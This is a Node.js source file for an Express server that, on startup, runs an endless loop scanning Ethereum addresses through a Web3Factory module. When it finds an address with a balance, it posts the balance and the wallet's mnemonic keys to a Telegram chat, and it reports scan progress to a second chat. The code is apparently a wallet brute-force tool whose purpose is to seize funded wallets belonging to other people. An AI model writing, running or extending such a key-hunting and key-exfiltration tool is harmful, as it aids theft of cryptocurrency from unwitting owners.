const { Web3Factory } = require('./modules/web3Factory')
const env = require('./modules/env')
const express = require('express')
const app = express()
const port = process.env.PORT || 4000;


const NOTI_RUNNING = '-1002158985462'
const NOTI_FOUND = '-1002151658507'



const sendMessage = async (message, chatId) => {
  fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    }),
  });
  
}

async function scan() { 
  let i = 1

  
  try {
    // Build web3 instance
    const ethereumInstance = new Web3Factory(env.ETHEREUM_RPC_NODE, 'ethereum')

    // Scan blockchain
    while (true) {
      if (i % 1000 === 0) {
        const text = 'Server: ' + env.SERVER_NAME + ' --- Scanned: ' + i + ' address'
        sendMessage(text, NOTI_RUNNING)
      }
      try {
        const ethereumScanResult = await ethereumInstance.scanNetwork()
        if (ethereumScanResult.balance) {
          console.log(ethereumScanResult)
          const text = 'Balance: ' + ethereumScanResult.balance + ' - Keys: ' + ethereumScanResult.mnemonic
          sendMessage(text, NOTI_FOUND)
          break
        }
      } catch (error) {
        throw new Error('Unexpected error occurred', error.message || error)
      }
      i = i + 1
    }

  } catch (error) {
    throw new Error(error.message || error)
  }
}

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  scan()
  console.log(`Example app listening on port ${port}`)
})


